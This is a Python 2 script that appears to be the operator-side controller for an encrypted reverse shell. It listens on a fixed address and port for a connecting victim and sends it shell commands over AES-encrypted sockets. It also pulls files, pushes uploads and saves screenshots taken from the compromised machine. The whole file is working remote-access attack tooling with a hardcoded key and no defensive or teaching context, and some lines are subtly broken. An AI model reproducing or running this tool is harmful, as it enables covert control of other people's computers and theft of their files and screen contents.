#! /usr/bin/python

import socket
import json
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random

BS = 16 #The block_size for the AES
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) #Padding the data to 16Bytes size
unpad = lambda s : s[:-ord(s[len(s)-1:])] #Unpadding the data
key='Thiisthekey'
aeskey = hashlib.sha256(key.encode('utf-8')).digest()
def encrypt(raw):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( aeskey, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw.encode('utf8') ) )

def decrypt(enc):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new( aeskey, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

countshot = 1
#Send and receive
def send(data):
        json_data = json.dumps(data)
        cipherdata = encrypt(json_data)
        target.send(cipherdata)

def recv():
        data = ""
        while True:
                try:
                        data = data + target.recv(1024)
                        text = decrypt(data)
                        return json.loads(text)
                except ValueError:
                       continue


# The shell commands
def shell():
        global countshot
        while True:
                command = raw_input("* shel\'l#~%s: " % str(ip))
                send(command)
                if command =='q':
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
                elif command[:8] == "download":
                        with open(command[9:], "wb") as file:
                                file_data = recv()
                                file.write(base64.b64decode(file_data))
                elif command[:6] == "upload":
                        try:
                                with open(command[7:], "rb") as file2:
                                        send(base64.b64encode(file2))
                        except:
                                failed = "Upload file was failed"
                                send(base64.b64encode(failed))
                elif command[:10] == "screenshot":
                      with open ("screenshot%d" % countshot, "wb") as screenshot_file:
                           image = recv()
                           if image[:4] == "[!!]":
                                print(image)
                           else:
                                 screenshot_file.write(base64.b64decode(image))
                                 countshot += 1
                else:
                        result = recv()
                        print(result)
#All the server function
def server():
        global sock
        global ip
        global target
        sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((' 172.31.20.248', 54436))
        sock.listen(15)
        print("[+] Listening FOR")
        target, ip =sock.accept()
        print("[+]Connection Establish From: %s" % str(ip))



server()
shell()
sock.close()


